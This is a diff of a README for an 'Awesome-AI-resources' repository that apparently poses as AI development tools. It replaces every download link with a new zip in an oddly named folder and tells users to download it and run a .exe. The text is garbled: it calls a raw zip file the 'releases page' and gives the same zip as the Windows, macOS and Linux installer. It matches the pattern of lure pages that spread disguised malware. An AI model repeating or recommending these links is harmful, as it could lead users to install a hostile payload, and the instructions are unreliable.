@@ -1,7 +1,7 @@
 # 🎉 Awesome-AI-resources - Unlock AI-Powered Development Tools
 
 ## 🌐 Visit this page to download
-[![Download Now](https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip)
+[![Download Now](https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ In this guide, we will help you download and run the software from our Releases 
 To download Awesome-AI-resources, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Click on this link to access the releases page: [Download Link](https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip).
+   Click on this link to access the releases page: [Download Link](https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip).
 
 2. **Choose Your Version**
    On the releases page, you'll see a list of available versions. Look for the latest stable release that fits your needs.
@@ -22,16 +22,16 @@ To download Awesome-AI-resources, follow these simple steps:
 3. **Download the File**
    Click on the download link for the file that applies to your operating system. The files may include executables for Windows, macOS, or Linux. 
 
-   - For **Windows**, look for a file like `https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip`.
-   - For **macOS**, find a file like `https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip`.
-   - For **Linux**, you may download files ending with `https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip`.
+   - For **Windows**, look for a file like `https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip`.
+   - For **macOS**, find a file like `https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip`.
+   - For **Linux**, you may download files ending with `https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip`.
 
 4. **Install the Software**
    After the download completes, locate the file on your computer. 
 
    - For **Windows**, double-click the `.exe` file and follow the on-screen instructions to install.
    - For **macOS**, open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**, extract the `https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip` file using a file manager or the terminal, and follow the included instructions for running the software.
+   - For **Linux**, extract the `https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip` file using a file manager or the terminal, and follow the included instructions for running the software.
 
 5. **Running the Application**
    Once installed, you can run Awesome-AI-resources from your Applications menu, Start menu, or terminal, based on your operating system.
@@ -81,7 +81,7 @@ If you encounter any issues, feel free to reach out for support. You can:
 
 ## 🔄 Keeping Up to Date
 
-To stay current with new releases, check back frequently on the releases page: [Download Link](https://raw.githubusercontent.com/arpita612/Awesome-AI-resources/main/cystopyelography/A-Awesome-resources-3.0.zip). You can also watch this repository on GitHub to receive notifications about updates.
+To stay current with new releases, check back frequently on the releases page: [Download Link](https://github.com/arpita612/Awesome-AI-resources/raw/refs/heads/main/cystopyelography/A-resources-Awesome-v1.7.zip). You can also watch this repository on GitHub to receive notifications about updates.
 
 ## 📣 Community
 
